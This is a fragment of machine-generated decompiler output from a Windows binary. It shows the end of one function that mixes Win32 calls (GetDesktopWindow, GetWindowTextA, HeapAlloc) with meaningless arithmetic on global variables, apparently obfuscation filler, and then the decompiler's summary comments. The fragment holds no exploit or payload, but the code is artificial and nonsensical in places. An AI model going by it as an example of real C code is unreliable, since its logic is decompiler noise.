  int v7; // [esp+114h] [ebp-14h]
  int v8; // [esp+118h] [ebp-10h]
  int v9; // [esp+120h] [ebp-8h]
  int v10; // [esp+124h] [ebp-4h]

  v6 = 0;
  hWnd = GetDesktopWindow();
  v9 = 74584 - 988067 * v10;
  String[0] = 1;
  dword_4040C0 = (745483 * v7) << (dword_404098 - v5);
  GetWindowTextA(hWnd, String, 200);
  dword_4040C0 = 999084 - dword_4040D0;
  ProcessHeap = GetProcessHeap();
  result = HeapAlloc(ProcessHeap, 0, dwBytes);
  dword_40408C = v8 - dword_40408C * v10;
  return result;
}
// 40408C: using guessed type int dword_40408C;
// 404098: using guessed type int dword_404098;
// 4040C0: using guessed type int dword_4040C0;
// 4040D0: using guessed type int dword_4040D0;
// 4025F0: using guessed type CHAR String[260];

// nfuncs=12 queued=11 decompiled=11 lumina nreq=0 worse=0 better=0
// ALL OK, 11 function(s) have been successfully decompiled
